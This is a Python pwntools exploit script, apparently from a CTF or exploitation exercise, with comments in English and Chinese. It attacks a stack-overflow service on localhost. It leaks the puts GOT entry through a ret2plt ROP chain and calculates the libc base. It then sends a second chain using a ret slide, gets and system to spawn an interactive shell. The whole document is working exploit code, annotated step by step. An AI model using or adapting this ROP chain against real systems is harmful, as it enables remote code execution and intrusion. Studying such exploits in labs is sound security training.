#!/usr/bin/env python
# -*- coding: utf-8 -*-

from pwn import *

r = remote('127.0.0.1', 10001)

# 以下三個都是固定的()
main = 0x804858d
puts_plt = 0x08048420 # we must jump to plt, therefore we can jump to  the function with plt. 我要call puts我就要跳這邊
puts_got = 0x0804a018 # puts的GOT的位址(看puts_plt LOAD_PTR啥的的最後面)，存放puts所在的位址的位址。(i.e. *puts_got才是puts的位址)。 因此，去讀puts_got的address的內容就是plt@libc的實際位址

# 以下三個為offset
puts_off = 0x65650     # Ubuntu 14.04.2 /lib/i386-linux-gnu/libc.so.6
system_off = 0x40190
gets_off = 0x64cd0

libc = ELF('/lib/i386-linux-gnu/libc.so.6')
puts_off = libc.symbols['puts']
system_off = libc.symbols['system']
gets_off = libc.symbols['gets']

r.send('A'*116 +
    p32(puts_plt) + # return to puts_plt, and puts the content of puts_got
    p32(main) + # after puts' execution, return to main。為何要return to main？因為我們這次ROP chain做完才能算出base，有base才能找到system之類的function address。所以必須在這次執行檔中讓他跳回main重跑才能繼續使用這個base，進行下次的exploit
    p32(puts_got) + # the argument1 to puts_plt
    '\n')

plt_got_content = r.recvline()[:4] # the first 4 bytes in little endian is the puts@libc 's address
base = u32(plt_got_content) - puts_off # 將puts@libc的addr - puts_off 即base

print enhex(plt_got_content)
print 'libc base =', hex(base)

system = base + system_off # 有base address即知道system address和gets address
gets = base + gets_off
'''
r.send('A'*124 + # 第二次padding會變，因為之前是用ret to main，這樣之前已經多pop了一個，又有alignment所以差更多。
    p32(gets) + # 讀sh進去
    p32(system) +
    p32(puts_got) +
    p32(puts_got) +
    '\n')
'''

ret = 0x8048680 # 隨便找一個ret
r.send(p32(ret) * 50 + # ROP slide, 利用一直return，每次都會pop eip，一直做到將gets_addr pop至$eip
    p32(gets) + # 讀
    p32(system) +
    p32(puts_got) +
    p32(puts_got) +
    '\n')

r.interactive()
